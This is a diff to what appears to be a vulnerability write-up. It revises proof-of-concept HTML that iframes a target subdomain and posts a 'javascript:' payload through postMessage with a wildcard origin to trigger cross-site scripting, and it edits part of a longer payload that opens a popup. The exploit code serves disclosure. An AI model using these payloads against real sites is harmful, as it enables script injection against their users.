@@ -153,13 +153,13 @@ It only took a few lines of code to find out.
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="target-frame" src="https://sub.target.com"></iframe>
-<script>
-target-frame.onload=function(){
-document.getElementById('target-frame').contentWindow.postMessage(
-'logged_in:javascript:alert(document.domain)','*');
-};
-</script>
+    <iframe id="target-frame" src="https://sub.target.com" width="800" height="600"></iframe>
+    <script>
+        document.getElementById('target-frame').onload = function() {
+            // Exploit payload triggers execution via location.assign sink
+            document.getElementById('target-frame').contentWindow.postMessage('logged_in:javascript:alert(document.domain)', '*');
+        };
+    </script>
 </body>
 </html>
 ```
@@ -255,7 +255,7 @@ Attacker
         document.getElementById('target-frame').onload = function() {
             
             var payload = "javascript:(function(){" +
-                "var url = 'https://sub.target.com/{provider-name}?source_url=' + encodeURIComponent(window.location.origin) + '&live_update=true';" +
+                "var url = 'https://sub.target.com/{provider-name}?url=' + encodeURIComponent(window.location.origin) + '&live_update=true';" +
                 "window.open(url, 'popup', 'width=800,height=600');" +
 
                 "window.addEventListener('hashchange', function() {" +
